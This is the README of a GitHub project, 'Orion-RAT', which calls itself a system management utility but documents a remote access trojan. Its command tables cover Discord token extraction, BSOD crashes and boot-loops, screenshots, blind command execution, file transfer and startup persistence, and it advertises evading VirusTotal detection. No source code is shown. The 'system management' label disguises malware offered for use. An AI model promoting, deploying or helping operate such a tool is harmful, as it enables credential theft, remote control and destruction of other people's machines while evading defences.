<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/bcc9cf71-a450-4559-a383-1c6eba8dbf5f" />


[![Top Language](https://img.shields.io/github/languages/top/plasma-bls/Orion-RAT?style=flat-square&color=58a6ff)](https://github.com/plasma-bls/Orion-RAT)
[![Stars](https://img.shields.io/github/stars/plasma-bls/Orion-RAT?style=flat-square&color=ffd700)](https://github.com/plasma-bls/Orion-RAT/stargazers)
[![Last Commit](https://img.shields.io/github/last-commit/plasma-bls/Orion-RAT?style=flat-square&color=32d74b)](https://github.com/plasma-bls/Orion-RAT/commits)
[![License](https://img.shields.io/github/license/plasma-bls/Orion-RAT?style=flat-square&color=ff6b6b)](LICENSE)
[![Issues](https://img.shields.io/github/issues/plasma-bls/Orion-RAT?style=flat-square&color=ff9500)](https://github.com/plasma-bls/Orion-RAT/issues)

[Report Bug](https://github.com/plasma-bls/Orion-RAT/issues) • [Request Feature](https://github.com/plasma-bls/Orion-RAT/issues/new)

</div>

## Important Notice

**Warning**: Orion-RAT includes powerful system commands that can affect system stability and security. Commands marked with **(W)** are Windows-specific and potentially destructive. Use advanced features with extreme caution and only in controlled environments. Also, this tool is still in development, so it might present bugs, misfunctions, not working commands on certain machines.

---
## Disclaimer about the author 
THIS CODE WAS MADE A LONG TIME AGO, SO IT'S NOT UPDATED TO MY NEW KNOWLEDGE, DON'T TAKE THIS AS AN EXAMPLE FOR WHAT I CAN DO NOR FOR WHAT I CAN'T DO. 

---
## Overview

**Orion-RAT** is a versatile command-line utility designed to streamline system management operations. With an intuitive interface and powerful commands, Orion-RAT allows you to navigate, manage, and monitor your system efficiently.

---

`$` is the prefix:

### Navigation and Information
| Command | Description | Example |
|---------|-------------|---------|
| `$pwd` | Show current directory | `$pwd` |
| `$whoami` | Display current user | `$whoami` |
| `$cd <path>` | Change directory | `$cd /home/user/documents` |
| `$ls` | List files in current directory | `$ls` |

### File and Directory Management
| Command | Description | Example |
|---------|-------------|---------|
| `$rm <file>` | Delete a single file | `$rm document.txt` |
| `$rmdir <dir>` | Delete an entire directory | `$rmdir old_folder` |
| `$upload <attachment>` | Upload a file | `$upload document.pdf` |
| `$download <path>` | Download a file | `$download /path/to/file.txt` |

### System Monitoring and Information
| Command | Description | Example |
|---------|-------------|---------|
| `$dmproc` | List all active processes | `$dmproc` |
| `$enum` | Display system & networking information | `$enum` |
| `$ss` | Take a screenshot | `$ss` |

### Process Management
| Command | Description | Example |
|---------|-------------|---------|
| `$kill <process>` | Terminate a specific process | `$kill notepad.exe` |
| `$exec <command>` | Execute a shell command | `$exec ipconfig` |

### System Control
| Command | Description | Example |
|---------|-------------|---------|
| `$restart` | Restart the system | `$restart` |
| `$shutdown` | Shutdown the system | `$shutdown` |
| `$add_startup <name>` | Add program to startup | `$add_startup myapp` |
| `$notf <text>` | Send a notification (Linux) | `$notf "Hello World"` |

### Utility Commands
| Command | Description | Example |
|---------|-------------|---------|
| `$hello` | Display greeting message | `$hello` |
| `$steak` | Try it and find out | `$steak` |

### Advanced Features (Use with Caution)
| Command | Description | Platform | Example |
|---------|-------------|----------|---------|
| `$gettoken` | Extract Discord tokens | Windows | `$gettoken` |
| `$bsod` | Trigger system crash (BSOD) | Windows | `$bsod` |
| `$bsodloop` | Create boot-loop BSOD | Windows | `$bsodloop` |

---

## Installation

### Method 1: Clone Repository
```bash
git clone https://github.com/plasma-bls/Orion-RAT.git
cd Orion-RAT
```

### Method 2: Direct Download
Download the latest release from the [releases page](https://github.com/plasma-bls/Orion-RAT/releases)

---

## Usage

### Quick Start
```bash
# Navigate to project directory
cd Orion-RAT

# Run Orion-RAT
./orion-tool

# Example commands
$pwd                   # Show current directory
$cd /home/user         # Change directory
$dmproc                # List processes
$rm old_file.txt       # Delete file
```

### Practical Examples

**Scenario 1: Directory Cleanup**
```bash
$pwd                           # Check current location
$ls                            # List current files
$rm file.txt                   # Remove file
$rmdir folder/                 # Remove directory
```

**Scenario 2: System Monitoring**
```bash
$whoami                       # Check current user
$enum                         # Get system information
$dmproc                       # List active processes
$ss                           # Take system screenshot
```

**Scenario 3: File Operations**
```bash
$cd /folder                  # Change directory
$upload report.pdf           # Upload a file
$download /backup/data.zip   # Download a file
```

**Scenario 4: Process Management**
```bash
$dmproc                      # List running processes
$kill file.exe               # Terminate unwanted process
$exec command                # Execute blind command
$add_startup <rat-path>      # Add tool to startup
```

---
---

<h2>
  <img src="https://i.postimg.cc/RVyc2ddD/exclamation-mark-2757.webp" width="30" height="30" style="vertical-align:middle;">
  Bug Reports
</h2>

Found a bug? Help us improve Orion-RAT:

1. Check if the bug hasn't already been reported
2. Create a [new issue](https://github.com/plasma-bls/Orion-RAT/issues/new)
3. Include:
   - Detailed problem description
   - Steps to reproduce the bug
   - Error output (if present)
   - System information

---

<h2>
  <img src="https://i.postimg.cc/Hkg2v3B9/rocket-1f680-1.webp" width="30" height="30" style="vertical-align:middle;">
  Key Features
</h2>


- [ ] Fast and safe
- [ ] Not backdoored
- [ ] Undetected to Uncoverit and Virus Total
- [ ] Open Source
- [ ] Auto-Startup Persistence
- [ ] Easy to Use

---

## License

This project is distributed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

## Author

**Plasma** - [GitHub Profile](https://github.com/plasma-bls)

---

## Contributors

**Sethy** - [GitHub Profile](https://github.com/quelloduro)
<br>
**Aniko** - [GitHub Profile](https://github.com/aniko33)


---

<div align="center">

<p>If Orion-RAT is useful to you, leave a star! <img src="https://i.postimg.cc/pTH5R15s/star-2b50.webp" width="30" height="30";"></p>


 
</div>
